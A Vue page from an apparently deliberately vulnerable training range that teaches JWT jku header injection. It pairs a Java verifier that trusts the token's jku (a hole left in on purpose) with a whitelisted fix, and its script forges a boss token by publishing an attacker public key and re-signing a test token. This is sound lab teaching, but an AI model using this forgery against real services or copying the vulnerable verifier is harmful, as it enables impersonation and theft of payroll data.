<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">JWT安全漏洞 -- jku 远程公钥</div>
      <div class="body-div">
        <el-tabs v-model="activeName">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              JWT 头里的 jku（JWK Set URL）用来标明验签公钥发布在哪个地址。登录中心用私钥签发员工令牌，并把公钥固定放在登录中心的地址；工资系统本应只拿这把公钥验签。漏洞版却读取令牌头里的 jku，地址指向哪就把哪把公钥拿来验签。<span style="color: red;">攻击者在本地生成一对 RSA 密钥，把公钥发布到自己的地址，再用私钥签一份 username=boss 的令牌</span>，工资系统就会验签通过并返回老板工资。只修改张三令牌里的用户名、不更换签名，仍然无法通过，因为登录中心的私钥没有泄露，老板也没有可登录的密码。
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              JWT jku 远程公钥漏洞的危害非常严重，攻击者一旦成功利用，就可以：<br /><br />
              身份伪造：不需要目标账号的密码，伪造任意员工的 JWT 令牌；<br />
              权限提升：把载荷中的 username 改成更高权限的账号，访问原本无权查看的数据；<br />
              数据泄露：工资等接口只根据验签结果查询，验签通过就会返回敏感数据；<br />
              检测困难：令牌算法仍是 RS256，签名本身合法，问题出在信任了令牌自带的公钥地址。
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              【必须】公钥地址白名单<br />
              只接受登录中心事先登记的 jku。令牌里写成其他地址时直接拒绝。<br /><br />
              【必须】先核对地址，再决定是否取公钥<br />
              地址不在白名单中时不要下载 jwks，避免把任意 URL 当成公钥来源。<br /><br />
              【必须】验签只用服务端持有的公钥<br />
              白名单通过后，使用登录中心自己的公钥验签，不使用令牌附带的密钥。<br /><br />
              【建议】固定签名算法<br />
              明确只接受 RS256，不要根据令牌头中的 alg 切换验签方式。
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection" target="_blank" style="text-decoration: underline;">《JWT authentication bypass via jku header injection》</a>：PortSwigger 对 jku 头注入、用攻击者公钥伪造令牌的实验说明。<br />
              <a href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.2" target="_blank" style="text-decoration: underline;">《RFC 7515：jku Header Parameter》</a>：jku 的标准定义，以及使用前必须确认该地址可被信任。<br />
              <a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">《OWASP JSON Web Token for Java Cheat Sheet》</a>：Java 中校验 JWT 时对 jku、算法和密钥来源的处理建议。
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              登录中心签发与工资查询（正常验签）
              <el-button type="primary" round size="mini" @click="baseVisible = true">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 登录中心签发：私钥签名，公钥地址固定写成登录中心
String token = Jwts.builder()
        .setHeaderParam("kid", "login-center")
        .setHeaderParam("jku", LOGIN_CENTER_JKU)
        .claim("username", user.getUsername())
        .signWith(SignatureAlgorithm.RS256, loginCenterPrivateKey)
        .compact();

// 工资查询：只拿登录中心公钥验签，不读取令牌里的 jku
Claims claims = Jwts.parser()
        .setSigningKey(loginCenterPublicKey())
        .parseClaimsJws(token)
        .getBody();
return payrollOf(claims.get("username"));</code></pre>
          </div>
        </el-col>
      </el-row>
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 — 按令牌里的 jku 取公钥
              <el-button type="danger" round size="mini" @click="vulnVisible = true">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 漏洞：验签公钥由令牌头里的 jku 决定
JSONObject header = readHeader(token);
String jku = header.getString("jku");

// 危险：地址指向哪，就把哪把公钥拿来验签
PublicKey key = loadKey(jku);
Claims claims = Jwts.parser()
        .setSigningKey(key)
        .parseClaimsJws(token)
        .getBody();
return payrollOf(claims.get("username"));</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码 — 只认登录中心的地址
              <el-button type="success" round size="mini" @click="secVisible = true">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">// 安全：先核对 jku，不是登录中心地址就拒绝
JSONObject header = readHeader(token);
String jku = header.getString("jku");
if (!LOGIN_CENTER_JKU.equals(jku)) {
    return error("jku 不是登录中心地址");
}

// 通过后仍使用登录中心自己的公钥，不使用令牌带来的密钥
Claims claims = Jwts.parser()
        .setSigningKey(loginCenterPublicKey())
        .parseClaimsJws(token)
        .getBody();</code></pre>
          </div>
        </el-col>
      </el-row>
    </div>

    <el-dialog :visible.sync="baseVisible" width="800px" :show-close="true" :close-on-click-modal="true">
      <div slot="title" style="text-align: center; font-size: 18px;">登录中心签发与工资查询</div>
      <div class="test-container">
        <div class="test-section">
          <h3>1. 登录中心登录 <span style="color: red; font-size: 14px; font-weight: normal;">(测试账号: zhangsan/123，这里不是靶场管理员登录)</span></h3>
          <el-form label-width="80px" inline>
            <el-form-item label="用户名">
              <el-input v-model="base.username" placeholder="请输入用户名" style="width: 200px;" />
            </el-form-item>
            <el-form-item label="密码">
              <el-input v-model="base.password" type="password" placeholder="请输入密码" style="width: 200px;" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" :loading="base.logging" @click="loginBase">登录</el-button>
            </el-form-item>
          </el-form>
          <div v-if="base.loginMessage" class="result-box">
            <el-alert
              :title="base.token ? '登录成功' : '登录失败'"
              :description="base.loginMessage"
              :type="base.token ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>2. 用这张令牌查询工资 <span style="color: red; font-size: 14px; font-weight: normal;">(只使用登录中心公钥)</span></h3>
          <div class="jwt-input-section">
            <h4>JWT Token：</h4>
            <el-input :value="base.token" type="textarea" :rows="4" placeholder="登录后在这里显示令牌" readonly />
          </div>
          <div v-if="base.headerText" class="jwt-input-section">
            <h4>Header（头部）：</h4>
            <el-input :value="base.headerText" type="textarea" :rows="2" readonly />
          </div>
          <div v-if="base.payloadText" class="jwt-input-section">
            <h4>Payload（载荷）：</h4>
            <el-input :value="base.payloadText" type="textarea" :rows="3" readonly />
          </div>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!base.token" :loading="base.querying" @click="queryBase">查询工资</el-button>
          </div>
          <div v-if="base.salaryText" class="result-box">
            <el-alert
              :title="base.salaryOk ? '验签通过' : '查询失败'"
              :description="base.salaryText"
              :type="base.salaryOk ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>3. 把 username 从 zhangsan 改成 boss <span style="color: red; font-size: 14px; font-weight: normal;">(签名保持不变)</span></h3>
          <p class="section-tip">Payload 里的 username 已经改成 boss，Header 保持原样。可以直接重新生成，也可以再改成别的内容。重新生成时只替换前两段，签名仍用原来的第三段。</p>
          <el-form label-width="90px">
            <el-form-item label="Header">
              <el-input v-model="base.editHeader" type="textarea" :rows="4" :disabled="!base.token" placeholder="登录后在这里显示头部" />
            </el-form-item>
            <el-form-item label="Payload">
              <el-input v-model="base.editPayload" type="textarea" :rows="6" :disabled="!base.token" placeholder="登录后在这里显示载荷，把 username 改成 boss" />
            </el-form-item>
          </el-form>
          <div class="jwt-test-buttons">
            <el-button type="warning" :disabled="!base.token" @click="rebuildBase">重新生成令牌</el-button>
          </div>
          <div class="jwt-input-section">
            <h4>篡改后的 JWT：</h4>
            <el-input :value="base.tamperedToken" type="textarea" :rows="4" placeholder="修改后点「重新生成令牌」" readonly />
          </div>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!base.tamperedToken" :loading="base.tamperQuerying" @click="queryTampered">查询工资</el-button>
          </div>
          <div v-if="base.tamperText" class="result-box">
            <el-alert
              :title="base.tamperOk ? '验签通过' : '验签失败'"
              :description="base.tamperText"
              :type="base.tamperOk ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
      </div>
    </el-dialog>

    <el-dialog :visible.sync="vulnVisible" width="800px" :show-close="true" :close-on-click-modal="true">
      <div slot="title" style="text-align: center; font-size: 18px;">jku 漏洞测试（换公钥地址）</div>
      <div class="test-container">
        <div class="test-section">
          <h3>攻击步骤说明</h3>
          <el-alert title="先拿到张三的正常令牌，再换成自己的公钥" type="warning" :closable="false" show-icon>
            <div style="text-align: left; line-height: 1.8;">
              <p><strong>第1步：</strong>用 zhangsan / 123 登录登录中心，拿到私钥签发的员工令牌。</p>
              <p><strong>第2步：</strong>在本地生成 RSA 密钥，公钥发布到 {{ attackUrl }}，私钥不上传。</p>
              <p><strong>第3步：</strong>表单里已经把 jku 和 username 改好，用本地私钥重新签名，再去查工资。也可以再改成别的内容。</p>
            </div>
          </el-alert>
        </div>
        <div class="test-section">
          <h3>1. 登录中心登录 <span style="color: red; font-size: 14px; font-weight: normal;">(测试账号: zhangsan/123)</span></h3>
          <el-form label-width="80px" inline>
            <el-form-item label="用户名">
              <el-input v-model="vuln.username" placeholder="请输入用户名" style="width: 200px;" />
            </el-form-item>
            <el-form-item label="密码">
              <el-input v-model="vuln.password" type="password" placeholder="请输入密码" style="width: 200px;" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" :loading="vuln.logging" @click="loginVuln">登录</el-button>
            </el-form-item>
          </el-form>
          <div v-if="vuln.token" class="jwt-input-section">
            <h4>张三正常登录的 JWT：</h4>
            <el-input :value="vuln.token" type="textarea" :rows="4" readonly />
          </div>
          <div v-if="vuln.headerText" class="jwt-input-section">
            <h4>Header（头部）：</h4>
            <el-input :value="vuln.headerText" type="textarea" :rows="2" readonly />
          </div>
          <div v-if="vuln.payloadText" class="jwt-input-section">
            <h4>Payload（载荷）：</h4>
            <el-input :value="vuln.payloadText" type="textarea" :rows="3" readonly />
          </div>
          <div v-if="vuln.loginMessage" class="result-box">
            <el-alert
              :title="vuln.token ? '登录成功' : '登录失败'"
              :description="vuln.loginMessage"
              :type="vuln.token ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>2. 生成自己的公私钥，并发布公钥</h3>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!vuln.token" :loading="vuln.generating" @click="generateVuln">生成并发布公钥</el-button>
          </div>
          <div v-if="vuln.publicText" class="jwt-input-section">
            <h4>公钥（已发布到 {{ attackUrl }}）：</h4>
            <el-input :value="vuln.publicText" type="textarea" :rows="6" readonly />
          </div>
          <div v-if="vuln.privatePem" class="jwt-input-section">
            <h4>私钥（只留在本地，不上传）：</h4>
            <el-input :value="vuln.privatePem" type="textarea" :rows="8" readonly />
          </div>
          <div v-if="vuln.keyMessage" class="result-box">
            <el-alert
              :title="vuln.generating ? '正在生成' : (vuln.keyPair ? '公钥已发布' : '发布失败')"
              :description="vuln.keyMessage"
              :type="vuln.generating ? 'warning' : (vuln.keyPair ? 'success' : 'error')"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>3. 用自己的私钥签老板令牌</h3>
          <p class="section-tip">表单已经按攻击目的改好：jku 指向 {{ attackUrl }}，kid 是 attacker，username 是 boss。可以直接用私钥签名，也可以再改成别的内容。</p>
          <el-form label-width="90px">
            <el-form-item label="Header">
              <el-input v-model="vuln.editHeader" type="textarea" :rows="5" :disabled="!vuln.token" placeholder="登录后在这里显示头部" />
            </el-form-item>
            <el-form-item label="Payload">
              <el-input v-model="vuln.editPayload" type="textarea" :rows="6" :disabled="!vuln.token" placeholder="登录后在这里显示载荷，把 username 改成 boss" />
            </el-form-item>
          </el-form>
          <div class="jwt-test-buttons">
            <el-button type="danger" :disabled="!vuln.keyPair" :loading="vuln.attacking" @click="signVuln">用私钥生成令牌</el-button>
          </div>
          <div class="jwt-input-section">
            <h4>篡改后的老板 JWT：</h4>
            <el-input :value="vuln.bossToken" type="textarea" :rows="4" placeholder="改完后点「用私钥生成令牌」" readonly />
          </div>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!vuln.bossToken" :loading="vuln.tamperQuerying" @click="queryVulnBoss">查询工资</el-button>
          </div>
          <div v-if="vuln.resultText" class="result-box">
            <el-alert
              :title="vuln.resultOk ? '验签通过' : '查询失败'"
              :description="vuln.resultText"
              :type="vuln.resultOk ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
          <div v-if="vuln.resultOk" class="result-box">
            <el-alert title="登录中心私钥没有出现" description="老板这张令牌是用本地私钥新签的，jku 指向刚发布的公钥。" type="warning" :closable="false" show-icon />
          </div>
        </div>
      </div>
    </el-dialog>

    <el-dialog :visible.sync="secVisible" width="800px" :show-close="true" :close-on-click-modal="true">
      <div slot="title" style="text-align: center; font-size: 18px;">jku 安全版测试（只认登录中心）</div>
      <div class="test-container">
        <div class="test-section">
          <h3>安全修复说明</h3>
          <el-alert title="步骤和漏洞版相同，差别只在最后一次查工资" type="success" :closable="false" show-icon>
            <div style="text-align: left; line-height: 1.8;">
              <p>安全版发现 jku 不是登录中心登记的地址，就不取公钥，也不返回工资。</p>
            </div>
          </el-alert>
        </div>
        <div class="test-section">
          <h3>1. 登录中心登录 <span style="color: red; font-size: 14px; font-weight: normal;">(测试账号: zhangsan/123)</span></h3>
          <el-form label-width="80px" inline>
            <el-form-item label="用户名">
              <el-input v-model="sec.username" placeholder="请输入用户名" style="width: 200px;" />
            </el-form-item>
            <el-form-item label="密码">
              <el-input v-model="sec.password" type="password" placeholder="请输入密码" style="width: 200px;" />
            </el-form-item>
            <el-form-item>
              <el-button type="primary" :loading="sec.logging" @click="loginSec">登录</el-button>
            </el-form-item>
          </el-form>
          <div v-if="sec.token" class="jwt-input-section">
            <h4>张三正常登录的 JWT：</h4>
            <el-input :value="sec.token" type="textarea" :rows="4" readonly />
          </div>
          <div v-if="sec.headerText" class="jwt-input-section">
            <h4>Header（头部）：</h4>
            <el-input :value="sec.headerText" type="textarea" :rows="2" readonly />
          </div>
          <div v-if="sec.payloadText" class="jwt-input-section">
            <h4>Payload（载荷）：</h4>
            <el-input :value="sec.payloadText" type="textarea" :rows="3" readonly />
          </div>
          <div v-if="sec.loginMessage" class="result-box">
            <el-alert
              :title="sec.token ? '登录成功' : '登录失败'"
              :description="sec.loginMessage"
              :type="sec.token ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>2. 生成自己的公私钥，并发布公钥</h3>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!sec.token" :loading="sec.generating" @click="generateSec">生成并发布公钥</el-button>
          </div>
          <div v-if="sec.publicText" class="jwt-input-section">
            <h4>公钥（已发布到 {{ attackUrl }}）：</h4>
            <el-input :value="sec.publicText" type="textarea" :rows="6" readonly />
          </div>
          <div v-if="sec.privatePem" class="jwt-input-section">
            <h4>私钥（只留在本地，不上传）：</h4>
            <el-input :value="sec.privatePem" type="textarea" :rows="8" readonly />
          </div>
          <div v-if="sec.keyMessage" class="result-box">
            <el-alert
              :title="sec.generating ? '正在生成' : (sec.keyPair ? '公钥已发布' : '发布失败')"
              :description="sec.keyMessage"
              :type="sec.generating ? 'warning' : (sec.keyPair ? 'success' : 'error')"
              :closable="false"
              show-icon
            />
          </div>
        </div>
        <div class="test-section">
          <h3>3. 用自己的私钥签老板令牌</h3>
          <p class="section-tip">表单已经按攻击目的改好：jku 指向 {{ attackUrl }}，kid 是 attacker，username 是 boss。可以直接用私钥签名，也可以再改成别的内容。</p>
          <el-form label-width="90px">
            <el-form-item label="Header">
              <el-input v-model="sec.editHeader" type="textarea" :rows="5" :disabled="!sec.token" placeholder="登录后在这里显示头部" />
            </el-form-item>
            <el-form-item label="Payload">
              <el-input v-model="sec.editPayload" type="textarea" :rows="6" :disabled="!sec.token" placeholder="登录后在这里显示载荷，把 username 改成 boss" />
            </el-form-item>
          </el-form>
          <div class="jwt-test-buttons">
            <el-button type="danger" :disabled="!sec.keyPair" :loading="sec.attacking" @click="signSec">用私钥生成令牌</el-button>
          </div>
          <div class="jwt-input-section">
            <h4>篡改后的老板 JWT：</h4>
            <el-input :value="sec.bossToken" type="textarea" :rows="4" placeholder="改完后点「用私钥生成令牌」" readonly />
          </div>
          <div class="jwt-test-buttons">
            <el-button type="primary" :disabled="!sec.bossToken" :loading="sec.tamperQuerying" @click="querySecBoss">查询工资</el-button>
          </div>
          <div v-if="sec.resultText" class="result-box">
            <el-alert
              :title="sec.resultOk ? '安全校验通过' : '安全校验失败'"
              :description="sec.resultText"
              :type="sec.resultOk ? 'success' : 'error'"
              :closable="false"
              show-icon
            />
          </div>
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { attackerJku, jkuLogin, publishAttackerJwk, querySalary, querySalarySec, querySalaryVuln } from '@/api/jwtJku'

function b64url(text) {
  return btoa(unescape(encodeURIComponent(text))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
}

function b64urlBytes(buf) {
  const bytes = new Uint8Array(buf)
  let bin = ''
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i])
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '')
}

function decodePart(part) {
  const pad = part + '='.repeat((4 - part.length % 4) % 4)
  const json = decodeURIComponent(escape(atob(pad.replace(/-/g, '+').replace(/_/g, '/'))))
  return JSON.parse(json)
}

function pem(buf) {
  const bytes = new Uint8Array(buf)
  let bin = ''
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i])
  const lines = btoa(bin).match(/.{1,64}/g).join('\n')
  return '-----BEGIN PRIVATE KEY-----\n' + lines + '\n-----END PRIVATE KEY-----'
}

function blankForm() {
  return {
    username: 'zhangsan',
    password: '123',
    logging: false,
    token: '',
    headerText: '',
    payloadText: '',
    editHeader: '',
    editPayload: '',
    loginMessage: '',
    querying: false,
    salaryOk: false,
    salaryText: '',
    tamperedToken: '',
    tamperQuerying: false,
    tamperOk: false,
    tamperText: '',
    generating: false,
    keyPair: null,
    publicText: '',
    privatePem: '',
    keyMessage: '',
    attacking: false,
    bossToken: '',
    bossHeader: '',
    bossPayload: '',
    resultOk: false,
    resultText: ''
  }
}

export default {
  name: 'JwtJku',
  data() {
    return {
      activeName: 'first',
      baseVisible: false,
      vulnVisible: false,
      secVisible: false,
      attackUrl: attackerJku(),
      base: blankForm(),
      vuln: blankForm(),
      sec: blankForm()
    }
  },
  methods: {
    async loginInto(which) {
      const username = this[which].username
      const password = this[which].password
      this[which] = Object.assign(blankForm(), { username, password, logging: true })
      try {
        const res = await jkuLogin(username, password)
        const token = res.data
        const parts = token.split('.')
        const header = decodePart(parts[0])
        const payload = decodePart(parts[1])
        const editHeader = Object.assign({}, header)
        const editPayload = Object.assign({}, payload)
        editPayload.username = 'boss'
        if (which !== 'base') {
          editHeader.kid = 'attacker'
          editHeader.jku = this.attackUrl
        }
        this[which] = Object.assign(blankForm(), {
          username,
          password,
          token,
          headerText: JSON.stringify(header),
          payloadText: JSON.stringify(payload),
          editHeader: JSON.stringify(editHeader, null, 2),
          editPayload: JSON.stringify(editPayload, null, 2),
          loginMessage: '登录中心已签发。这张令牌只代表张三。'
        })
      } catch (e) {
        this[which] = Object.assign(blankForm(), {
          username,
          password,
          loginMessage: e.message || '登录失败'
        })
      }
    },
    loginBase() {
      this.loginInto('base')
    },
    loginVuln() {
      this.loginInto('vuln')
    },
    loginSec() {
      this.loginInto('sec')
    },
    async queryBase() {
      this.base.querying = true
      this.base.salaryText = ''
      try {
        const res = await querySalary(this.base.token)
        this.base.salaryOk = true
        this.base.salaryText = '验签通过。' + res.data.name + '的月薪：' + res.data.salary + ' 元。'
      } catch (e) {
        this.base.salaryOk = false
        this.base.salaryText = e.message || '查询失败'
      } finally {
        this.base.querying = false
      }
    },
    rebuildBase() {
      const parts = this.base.token.split('.')
      let header
      let payload
      try {
        header = JSON.parse(this.base.editHeader)
        payload = JSON.parse(this.base.editPayload)
      } catch (e) {
        this.base.tamperedToken = ''
        this.base.tamperOk = false
        this.base.tamperText = 'Header 或 Payload 不是合法的 JSON，没有生成新令牌。'
        return
      }
      this.base.tamperedToken = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload)) + '.' + parts[2]
      this.base.tamperOk = false
      this.base.tamperText = ''
    },
    async queryTampered() {
      this.base.tamperQuerying = true
      this.base.tamperText = ''
      try {
        const res = await querySalary(this.base.tamperedToken)
        this.base.tamperOk = true
        this.base.tamperText = '验签通过。' + res.data.name + '的月薪：' + res.data.salary + ' 元。'
      } catch (e) {
        this.base.tamperOk = false
        this.base.tamperText = e.message || '验签失败'
      } finally {
        this.base.tamperQuerying = false
      }
    },
    async generateInto(which) {
      if (!window.crypto || !window.crypto.subtle) {
        this[which].keyMessage = '当前页面不是安全上下文，浏览器不能生成密钥。请用 localhost 或 127.0.0.1 打开靶场。'
        return
      }
      const current = Object.assign(blankForm(), this[which], {
        generating: true,
        keyPair: null,
        publicText: '',
        privatePem: '',
        keyMessage: '正在生成 RSA 密钥对…',
        bossToken: '',
        bossHeader: '',
        bossPayload: '',
        resultText: ''
      })
      this[which] = current
      try {
        const pair = await window.crypto.subtle.generateKey(
          { name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
          true,
          ['sign', 'verify']
        )
        const exported = await window.crypto.subtle.exportKey('jwk', pair.publicKey)
        const pkcs8 = await window.crypto.subtle.exportKey('pkcs8', pair.privateKey)
        const pub = { kty: exported.kty, kid: 'attacker', use: 'sig', alg: 'RS256', n: exported.n, e: exported.e }
        await publishAttackerJwk(pub)
        this[which] = Object.assign(blankForm(), current, {
          generating: false,
          keyPair: pair,
          publicText: JSON.stringify(pub, null, 2),
          privatePem: pem(pkcs8),
          keyMessage: '公钥地址已就绪。下一步用这把私钥给老板令牌签名。'
        })
      } catch (e) {
        this[which] = Object.assign(blankForm(), current, {
          generating: false,
          keyPair: null,
          keyMessage: e.message || '生成或发布公钥失败'
        })
      }
    },
    generateVuln() {
      this.generateInto('vuln')
    },
    generateSec() {
      this.generateInto('sec')
    },
    async signWith(keyPair, header, payload) {
      const signingInput = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(payload))
      const sig = await window.crypto.subtle.sign(
        'RSASSA-PKCS1-v1_5',
        keyPair.privateKey,
        new TextEncoder().encode(signingInput)
      )
      return {
        token: signingInput + '.' + b64urlBytes(sig),
        header: JSON.stringify(header),
        payload: JSON.stringify(payload)
      }
    },
    async signVuln() {
      const keyPair = this.vuln.keyPair
      let header
      let payload
      try {
        header = JSON.parse(this.vuln.editHeader)
        payload = JSON.parse(this.vuln.editPayload)
      } catch (e) {
        this.vuln.bossToken = ''
        this.vuln.resultOk = false
        this.vuln.resultText = 'Header 或 Payload 不是合法的 JSON，没有生成新令牌。'
        return
      }
      const current = Object.assign(blankForm(), this.vuln, { attacking: true, resultText: '', bossToken: '' })
      this.vuln = current
      try {
        const signed = await this.signWith(keyPair, header, payload)
        this.vuln = Object.assign(blankForm(), current, {
          attacking: false,
          bossToken: signed.token,
          bossHeader: signed.header,
          bossPayload: signed.payload
        })
      } catch (e) {
        this.vuln = Object.assign(blankForm(), current, {
          attacking: false,
          resultOk: false,
          resultText: e.message || '签名失败'
        })
      }
    },
    async queryVulnBoss() {
      const token = this.vuln.bossToken
      const current = Object.assign(blankForm(), this.vuln, { tamperQuerying: true, resultText: '' })
      this.vuln = current
      try {
        const res = await querySalaryVuln(token)
        this.vuln = Object.assign(blankForm(), current, {
          tamperQuerying: false,
          resultOk: true,
          resultText: '漏洞版按 jku 取到上面的攻击者公钥，验签通过。' + res.data.name + '的月薪：' + res.data.salary + ' 元。'
        })
      } catch (e) {
        this.vuln = Object.assign(blankForm(), current, {
          tamperQuerying: false,
          resultOk: false,
          resultText: e.message || '查询失败'
        })
      }
    },
    async signSec() {
      const keyPair = this.sec.keyPair
      let header
      let payload
      try {
        header = JSON.parse(this.sec.editHeader)
        payload = JSON.parse(this.sec.editPayload)
      } catch (e) {
        this.sec.bossToken = ''
        this.sec.resultOk = false
        this.sec.resultText = 'Header 或 Payload 不是合法的 JSON，没有生成新令牌。'
        return
      }
      const current = Object.assign(blankForm(), this.sec, { attacking: true, resultText: '', bossToken: '' })
      this.sec = current
      try {
        const signed = await this.signWith(keyPair, header, payload)
        this.sec = Object.assign(blankForm(), current, {
          attacking: false,
          bossToken: signed.token,
          bossHeader: signed.header,
          bossPayload: signed.payload
        })
      } catch (e) {
        this.sec = Object.assign(blankForm(), current, {
          attacking: false,
          resultOk: false,
          resultText: e.message || '签名失败'
        })
      }
    },
    async querySecBoss() {
      const token = this.sec.bossToken
      const current = Object.assign(blankForm(), this.sec, { tamperQuerying: true, resultText: '' })
      this.sec = current
      try {
        const res = await querySalarySec(token)
        this.sec = Object.assign(blankForm(), current, {
          tamperQuerying: false,
          resultOk: true,
          resultText: '安全版意外返回了工资。' + res.data.name + '的月薪：' + res.data.salary + ' 元。'
        })
      } catch (e) {
        this.sec = Object.assign(blankForm(), current, {
          tamperQuerying: false,
          resultOk: false,
          resultText: e.message || '已拒绝'
        })
      }
    }
  }
}
</script>

<style scoped>
.vuln-info { border-radius: 10px; margin: 10px 20px 20px; }
.header-div { font-size: 24px; color: #409EFF; font-weight: bold; padding: 10px; border-bottom: 1px solid #ccc; }
.body-div { padding: 10px; font-size: 14px; }
.vuln-detail { background-color: #dce9f8; padding: 10px; }
.code-demo { margin: 20px; border-top: 1px solid #ccc; padding-top: 20px; }
pre code { font-size: 12px; }
.el-row { margin-bottom: 20px; }
.el-col { border-radius: 4px; }
.bg-purple { background: #d3dce6; }
.grid-content { border-radius: 4px; height: 100%; padding: 10px; }
.grid-flex { display: flex; align-items: stretch; }
.test-container { padding: 20px; }
.test-section { margin-bottom: 30px; padding: 20px; border: 1px solid #e4e7ed; border-radius: 8px; background-color: #fafafa; }
.test-section h3 { margin-top: 0; margin-bottom: 15px; color: #409EFF; font-size: 16px; }
.test-section h4 { margin: 0 0 8px; font-size: 14px; }
.section-tip { margin: 0 0 12px; font-size: 13px; color: #606266; line-height: 1.7; }
.jwt-input-section { margin-bottom: 15px; }
.jwt-test-buttons { margin-bottom: 15px; }
.jwt-test-buttons .el-button { margin-right: 10px; }
.result-box { margin-top: 15px; }
</style>
